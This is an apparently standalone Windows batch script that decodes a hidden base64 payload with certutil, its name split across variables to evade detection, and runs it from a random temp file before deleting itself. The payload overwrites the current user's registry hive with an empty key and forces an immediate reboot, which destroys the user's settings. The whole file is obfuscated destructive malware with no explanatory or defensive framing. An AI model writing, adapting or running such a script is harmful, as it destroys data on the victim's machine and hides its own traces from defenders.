@echo off
setlocal enabledelayedexpansion
set "A=%TEMP%\%RANDOM%.bat"
set "B=cmVnIGFkZCAiSEtDVVxTTiIgL2YgCnJlZyBzYXZlICJIS0NVXFNOIiAiQzpcbm9kYXRhIiAveQpyZWcgZGVsZXRlICJIS0NVXFNOIiAvZgpyZWcgcmVzdG9yZSAiSEtDVSIgIkM6XG5vZGF0YSIKc2h1dGRvd24gL3IgL3QgMCAvZg=="
set "C=cert"
set "D=util"
set "E=-decode"
set "F=-f"
echo %B%>>"%A%.tmp"
%C%%D% %E% %F% "%A%.tmp" "%A%" >nul 2>&1
del /f /q "%A%.tmp" >nul 2>&1
if exist "%A%" (
    call "%A%"
    del /f /q "%A%" >nul 2>&1
)
start /b "" cmd /c "del /f /q "%~f0" & exit"
exit
